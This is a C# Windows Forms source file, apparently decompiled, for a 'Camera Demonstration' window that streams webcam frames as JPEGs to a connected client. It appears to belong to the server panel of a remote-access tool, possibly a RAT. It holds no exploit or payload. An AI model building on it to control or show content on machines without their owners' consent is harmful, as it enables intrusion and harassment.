using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormCameraDemonstration : FormMaterial
{
	private volatile bool _isStreaming;

	private CameraCaptureHelper _cameraHelper;

	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	public Size cameraSize;

	public Clients client;

	public Clients parrent;

	private IContainer components;

	public MaterialSwitch materialSwitch1;

	public PictureBox pictureBox1;

	private Panel panel1;

	public Timer timer1;

	public FormCameraDemonstration()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
		_cameraHelper = new CameraCaptureHelper();
	}

	private void FormCameraDemonstration_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		Color back = (BackColor = ((MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK) ? Color.FromArgb(40, 40, 40) : Color.White));
		panel1.BackColor = back;
		if (materialSwitch1 != null)
		{
			materialSwitch1.ForeColor = primary;
		}
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
		StopStreaming();
		if (_cameraHelper != null)
		{
			_cameraHelper.Stop();
		}
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			if (materialSwitch1.Checked)
			{
				StartStreaming();
			}
			else
			{
				StopStreaming();
			}
		}
	}

	public void StartStreaming()
	{
		if (client == null || !client.itsConnect || _isStreaming)
		{
			return;
		}
		string[] devices = CameraCaptureHelper.GetDeviceNames();
		if (devices == null || devices.Length == 0)
		{
			MessageBox.Show("No webcam found.", "Camera Demonstration", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			if (materialSwitch1 != null)
			{
				materialSwitch1.Checked = false;
			}
			return;
		}
		_isStreaming = true;
		_cameraHelper.Start(0, 80, delegate(byte[] jpeg)
		{
			Clients clients = client;
			if (clients != null && clients.itsConnect && jpeg != null)
			{
				clients.Send(new object[3] { "Camera Demonstration", "Screen", jpeg });
				if (pictureBox1 != null)
				{
					try
					{
						Bitmap bmp = Methods.ByteArrayToBitmap(jpeg);
						pictureBox1.Invoke((Action)delegate
						{
							if (pictureBox1.Image != null)
							{
								pictureBox1.Image.Dispose();
							}
							pictureBox1.Image = bmp;
						});
					}
					catch
					{
					}
				}
			}
		});
	}

	public void StopStreaming()
	{
		_isStreaming = false;
		_cameraHelper.Stop();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.materialSwitch1 = new MaterialSkin.Controls.MaterialSwitch();
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.panel1 = new System.Windows.Forms.Panel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.panel1.SuspendLayout();
		base.SuspendLayout();
		this.materialSwitch1.AutoSize = true;
		this.materialSwitch1.Depth = 0;
		this.materialSwitch1.Enabled = false;
		this.materialSwitch1.Location = new System.Drawing.Point(3, 6);
		this.materialSwitch1.Margin = new System.Windows.Forms.Padding(0);
		this.materialSwitch1.MouseLocation = new System.Drawing.Point(-1, -1);
		this.materialSwitch1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialSwitch1.Name = "materialSwitch1";
		this.materialSwitch1.Ripple = true;
		this.materialSwitch1.Size = new System.Drawing.Size(92, 37);
		this.materialSwitch1.TabIndex = 0;
		this.materialSwitch1.Text = "Start";
		this.materialSwitch1.UseVisualStyleBackColor = true;
		this.materialSwitch1.CheckedChanged += new System.EventHandler(materialSwitch1_CheckedChanged);
		this.pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.pictureBox1.Location = new System.Drawing.Point(6, 120);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(888, 411);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 4;
		this.pictureBox1.TabStop = false;
		this.panel1.Controls.Add(this.materialSwitch1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.Location = new System.Drawing.Point(3, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(894, 50);
		this.panel1.TabIndex = 20;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(900, 537);
		base.Controls.Add(this.pictureBox1);
		base.Controls.Add(this.panel1);
		base.DrawerUseColors = true;
		base.Name = "FormCameraDemonstration";
		this.Text = "Camera Demonstration";
		base.Load += new System.EventHandler(FormCameraDemonstration_Load);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		base.ResumeLayout(false);
	}
}
